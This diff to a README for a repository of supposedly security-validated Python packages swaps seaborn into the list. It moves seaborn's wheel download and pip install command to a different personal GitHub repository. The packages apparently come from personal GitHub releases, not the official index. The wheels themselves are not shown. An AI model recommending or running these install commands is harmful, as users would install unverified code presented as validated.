@@ -28,7 +28,7 @@ This repository contains Python packages validated through automated security sc
 | [`xlrd`](#xlrd) | `2.0.2` | 2026-06-11 |
 | [`uv`](#uv) | `0.11.20` | 2026-06-11 |
 | [`sqlalchemy`](#sqlalchemy) | `2.0.50` | 2026-06-11 |
-| [`reportlab`](#reportlab) | `4.5.1` | 2026-06-11 |
+| [`seaborn`](#seaborn) | `0.13.2` | 2026-06-11 |
 
 ## 📦 Available Packages
 
@@ -627,13 +627,14 @@ pip install https://github.com/bdousa/pythonFeedWindows/releases/download/ruff-v
 
 #### `seaborn`
 - **Latest version:** `0.13.2`
-- **Validated:** 2025-10-10
+- **Validated:** 2026-06-11
 - **Package type:** Universal wheel (Python 3+)
-- **Download wheel:** [download](https://github.com/bdousa/pythonFeedWindows/releases/download/seaborn-v0.13.2/seaborn-0.13.2-py3-none-any.whl)
-- **Release notes:** [release](https://github.com/bdousa/pythonFeedWindows/releases/tag/seaborn-v0.13.2)
+- **Download wheel:** [download](https://github.com/bdousa/PythonFeed-Update/releases/download/seaborn-v0.13.2/seaborn-0.13.2-py3-none-any.whl)
+- **Release notes:** [release](https://github.com/bdousa/PythonFeed-Update/releases/tag/seaborn-v0.13.2)
+- **Validation run:** [build #27298859958](https://github.com/bdousa/PythonFeed-Update/actions/runs/27298859958)
 - **Quick command:**
 ```text
-pip install https://github.com/bdousa/pythonFeedWindows/releases/download/seaborn-v0.13.2/seaborn-0.13.2-py3-none-any.whl
+pip install https://github.com/bdousa/PythonFeed-Update/releases/download/seaborn-v0.13.2/seaborn-0.13.2-py3-none-any.whl
 ```
 
 #### `sqlalchemy`
@@ -771,6 +772,6 @@ To request validation of a new package:
 2. **Select Category**: Choose '3rd party library approval'
 3. **Approval Process**: Packages typically validated within 3 business days
 
-*Last updated: 2026-06-11 17:15 UTC*
+*Last updated: 2026-06-11 17:17 UTC*
 
 *Powered by Azure DevOps Security Pipeline*
